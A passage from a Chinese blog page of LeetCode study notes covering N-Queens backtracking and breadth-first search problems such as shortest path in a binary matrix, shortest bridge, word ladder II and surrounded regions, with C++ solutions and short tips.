class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：这道题是非常典型的修改访问标记。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/n-queens">N皇后</a><br>按照国际象棋的规则，皇后可以攻击与之处在同一行或同一列或同一斜线上的棋子。n皇后问题研究的是如何将n个皇后放置在n×n的棋盘上，并且使皇后彼此之间不能相互攻击。<br>给你一个整数n，返回所有不同的n皇后问题的解决方案。每一种解法包含一个不同的n皇后问题的棋子放置方案，该方案中’Q’和’.’分别代表了皇后和空位。<br><img src="https://assets.leetcode.com/uploads/2020/11/13/queens.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">solveNQueens</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; res;</span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">board</span><span class="params">(n, string(n, <span class="string">&#x27;.&#x27;</span>))</span></span>;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; chess;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">            <span class="built_in">solve</span>(res, board, n, <span class="number">0</span>, i, chess);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(vector&lt;vector&lt;string&gt;&gt;&amp; solutions, vector&lt;string&gt;&amp; board, <span class="type">int</span> n, <span class="type">int</span> x, <span class="type">int</span> y, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; chess)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (chess.<span class="built_in">size</span>() == n - <span class="number">1</span>) &#123;</span><br><span class="line">            board[x][y] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">            solutions.<span class="built_in">push_back</span>(board);</span><br><span class="line">            board[x][y] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        chess.<span class="built_in">push_back</span>(&#123;x, y&#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> [j, k] : chess) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == k || <span class="built_in">abs</span>(x + <span class="number">1</span> - j) == <span class="built_in">abs</span>(i - k)) &#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (flag) <span class="keyword">continue</span>;</span><br><span class="line">            board[x][y] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">            <span class="built_in">solve</span>(solutions, board, n, x + <span class="number">1</span>, i, chess);</span><br><span class="line">            board[x][y] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        chess.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：分析一下状态即可，棋盘的字符即是标志位。</p></li></ul><h2 id="三、广度优先搜索"><a href="#三、广度优先搜索" class="headerlink" title="三、广度优先搜索"></a>三、广度优先搜索</h2><ul><li><p>算法解释：广度优先搜索(breadth-ﬁrst search，BFS)不同与深度优先搜索，它是一层层进行遍历的，因此需要用先入先出的队列(queue)而非先入后出的栈(stack)进行遍历。由于是按层次进行遍历，广度优先搜索时按照“广”的方向进行遍历的，也常常用来处理最短路径等问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> /</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>考虑上面这棵简单的树，其广度优先搜索的顺序为1-&gt;2-&gt;3-&gt;4。</p></li><li><p>补充：深度优先搜索和广度优先搜索都可以处理可达性问题，即从一个节点开始是否能达到另一个节点。</p></li><li><p>题目一：<a href="https://leetcode.cn/problems/shortest-path-in-binary-matrix">二进制矩阵中的最短路径</a><br>给定一个二维0-1矩阵，其中1表示障碍，0表示道路，每个位置与周围八个格子相连。求从左上角到右下角的最短到达距离。如果没有可以到达的方法，返回-1。、<br><img src="https://assets.leetcode.com/uploads/2021/02/18/example1_1.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; direction = &#123;<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">shortestPathBinaryMatrix</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (grid[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; location;</span><br><span class="line">        <span class="type">int</span> n = grid.<span class="built_in">size</span>(), depth = <span class="number">0</span>;</span><br><span class="line">        location.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">        grid[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (!location.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            ++depth;</span><br><span class="line">            <span class="type">int</span> len = location.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">while</span> (len--) &#123;</span><br><span class="line">                <span class="keyword">auto</span> [i, j] = location.<span class="built_in">front</span>();</span><br><span class="line">                <span class="comment">// cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; j &lt;&lt; endl;</span></span><br><span class="line">                location.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (i == n - <span class="number">1</span> &amp;&amp; j == n - <span class="number">1</span>) <span class="keyword">return</span> depth;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; ++k) &#123;</span><br><span class="line">                    <span class="type">int</span> x = i + direction[k];</span><br><span class="line">                    <span class="type">int</span> y = j + direction[k + <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= n || y &lt; <span class="number">0</span> || y &gt;= n || grid[x][y] == <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">                    location.<span class="built_in">push</span>(&#123;x, y&#125;);</span><br><span class="line">                    grid[x][y] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            len = location.<span class="built_in">size</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：记得改变访问状态。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/shortest-bridge">最短的桥</a><br>给你一个大小为nxn的二元矩阵grid ，其中1表示陆地，0表示水域。岛是由四面相连的1形成的一个最大组，即不会与非组内的任何其他1相连。grid中恰好存在两座岛。<br>你可以将任意数量的0变为1，以使两座岛连接起来，变成一座岛 。返回必须翻转的0的最小数目。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; direction = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">shortestBridge</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; location;</span><br><span class="line">        <span class="type">int</span> n = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> depth = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n &amp;&amp; depth &lt; <span class="number">0</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="built_in">findOnePlace</span>(grid, location, i, j, n);</span><br><span class="line">                    ++depth;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!location.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> length = location.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">while</span> (length--) &#123;</span><br><span class="line">                <span class="keyword">auto</span> [i, j] = location.<span class="built_in">front</span>();</span><br><span class="line">                location.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k) &#123;</span><br><span class="line">                    <span class="type">int</span> x = i + direction[k];</span><br><span class="line">                    <span class="type">int</span> y = j + direction[k + <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= n || y &lt; <span class="number">0</span> || y &gt;= n || grid[x][y] == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">if</span> (grid[x][y] == <span class="number">1</span>) <span class="keyword">return</span> depth;</span><br><span class="line">                    grid[x][y] = <span class="number">-1</span>;</span><br><span class="line">                    location.<span class="built_in">push</span>(&#123;x, y&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            length = location.<span class="built_in">size</span>();</span><br><span class="line">            ++depth;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">findOnePlace</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; location, <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= n || y &lt; <span class="number">0</span> || y &gt;= n || grid[x][y] != <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">        location.<span class="built_in">push</span>(&#123;x, y&#125;);</span><br><span class="line">        grid[x][y] = <span class="number">-1</span>; <span class="comment">// record visited location</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="built_in">findOnePlace</span>(grid, location, x + direction[i], y + direction[i + <span class="number">1</span>], n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：先用深度搜索找到一个岛再找第二个岛。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/word-ladder-ii">单词接龙 II</a><br>按字典wordList完成从单词beginWord到单词endWord转化，一个表示此过程的转换序列是形式上像beginWord-&gt;s1-&gt;s2-&gt;…-&gt;sk这样的单词序列，并满足：</p><ul><li>每对相邻的单词之间仅有单个字母不同。</li><li>转换过程中的每个单词si(1&lt;&#x3D;i&lt;&#x3D;k)必须是字典wordList中的单词。注意，beginWord不必是字典wordList中的单词。</li><li>s_k &#x3D;&#x3D; endWord<br>给你两个单词beginWord和endWord，以及一个字典wordList。请你找出并返回所有从beginWord到endWord的最短转换序列，如果不存在这样的转换序列，返回一个空列表。每个序列都应该以单词列表[beginWord, s1, s2, …, sk]的形式返回。</li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">findLadders</span>(string beginWord, string endWord, vector&lt;string&gt; &amp;wordList) &#123;</span><br><span class="line">        <span class="type">int</span> length = wordList.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> wordLength = wordList[<span class="number">0</span>].<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; connection;</span><br><span class="line">        vector&lt;string&gt; ladder;</span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ladders;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(length, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; ladderTrace;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; first;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; temp;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; length; ++j) &#123;</span><br><span class="line">                <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; wordLength; ++k) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (wordList[i][k] != wordList[j][k])</span><br><span class="line">                        ++count;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (count == <span class="number">1</span>)</span><br><span class="line">                    temp.<span class="built_in">push_back</span>(j);</span><br><span class="line">            &#125;</span><br><span class="line">            connection.<span class="built_in">push_back</span>(temp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; wordLength; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (beginWord[j] != wordList[i][j])</span><br><span class="line">                    ++count;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">1</span>) &#123;</span><br><span class="line">                ladderTrace.<span class="built_in">push</span>(i);</span><br><span class="line">                visited[i] = <span class="literal">true</span>;</span><br><span class="line">                first.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span> (!ladderTrace.<span class="built_in">empty</span>() &amp;&amp; !flag) &#123;</span><br><span class="line">            <span class="type">int</span> count = ladderTrace.<span class="built_in">size</span>();</span><br><span class="line">            ++depth;</span><br><span class="line">            <span class="keyword">while</span> (count--) &#123;</span><br><span class="line">                <span class="type">int</span> next = ladderTrace.<span class="built_in">front</span>();</span><br><span class="line">                ladderTrace.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (wordList[next] == endWord) &#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i : connection[next]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i]) &#123;</span><br><span class="line">                        ladderTrace.<span class="built_in">push</span>(i);</span><br><span class="line">                        visited[i] = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count = ladderTrace.<span class="built_in">size</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;&#123;beginWord, endWord&#125;&#125;;</span><br><span class="line">        ladder.<span class="built_in">push_back</span>(beginWord);</span><br><span class="line">        visited.<span class="built_in">assign</span>(length, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> index : first) &#123;</span><br><span class="line">            ladder.<span class="built_in">push_back</span>(wordList[index]);</span><br><span class="line">            <span class="built_in">dfs</span>(wordList, endWord, ladders, ladder, connection, index, visited, depth);</span><br><span class="line">            ladder.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ladders;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;string&gt;&amp; wordList, string&amp; endWord, vector&lt;vector&lt;string&gt;&gt; &amp;ladders, vector&lt;string&gt; &amp;ladder, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;connection, <span class="type">int</span> index, vector&lt;<span class="type">bool</span>&gt; visited, <span class="type">int</span> depth)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">1</span> &amp;&amp; ladder.<span class="built_in">back</span>() == endWord) &#123;</span><br><span class="line">            ladders.<span class="built_in">push_back</span>(ladder);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[index] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : connection[index]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visited[num]) &#123;</span><br><span class="line">                ladder.<span class="built_in">push_back</span>(wordList[num]);</span><br><span class="line">                <span class="built_in">dfs</span>(wordList, endWord, ladders, ladder, connection, num, visited, depth - <span class="number">1</span>);</span><br><span class="line">                ladder.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[index] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：先广度搜索找出最短长度，再用深度搜索找路径，但是我的代码时间超限，还可以继续优化<del>(我不会了)</del>。</p></li></ul><h2 id="四、练习"><a href="#四、练习" class="headerlink" title="四、练习"></a>四、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/surrounded-regions">被围绕的区域</a><br>给你一个mxn的矩阵board，由若干字符’X’和’O’组成，捕获所有被围绕的区域：</p><ul><li>连接：一个单元格与水平或垂直方向上相邻的单元格连接。</li><li>区域：连接所有’O’的单元格来形成一个区域。</li><li>围绕：如果您可以用’X’ 单元格连接这个区域，并且区域中没有任何单元格位于board边缘，则该区域被’X’单元格围绕。<br>通过<strong>原地</strong>将输入矩阵中的所有’O’替换为’X’来捕获被围绕的区域。你不需要返回任何值。<br><img src="https://pic.leetcode.cn/1718167191-XNjUTG-image.png" alt="示例图"></li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; direction = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = board.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = board[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[i][<span class="number">0</span>] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, i, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (board[i][n - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, i, n - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[<span class="number">0</span>][j] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, <span class="number">0</span>, j);</span><br><span class="line">            <span class="keyword">if</span> (board[m - <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, m - <span class="number">1</span>, j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;#&#x27;</span>) board[i][j] = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, <span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        board[x][y] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> x1 = x + direction[i];</span><br><span class="line">            <span class="type">int</span> y1 = y + direction[i + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (x1 &lt; <span class="number">0</span> || x1 &gt;= board.<span class="built_in">size</span>() || y1 &lt; <span class="number">0</span> || y1 &gt;= board[<span class="number">0</span>].<span class="built_in">size</span>()) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (board[x1][y1] == <span class="string">&#x27;O&#x27;</span>) <span class="built_in">dfs</span>(board, x1, y1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：和大西洋太平洋水流问题差不多，因为起点如果从’X’开始，那么会很麻烦，不如从边缘的’O’开始。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/combination-sum-ii">组合总和 II</a><br>给定一个候选人编号的集合candidates和一个目标数target，找出candidates中所有可以使数字和为target的组合。<br>candidates中的每个数字在每个组合中只能使用一次，解集不能包含重复的组合。  </p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 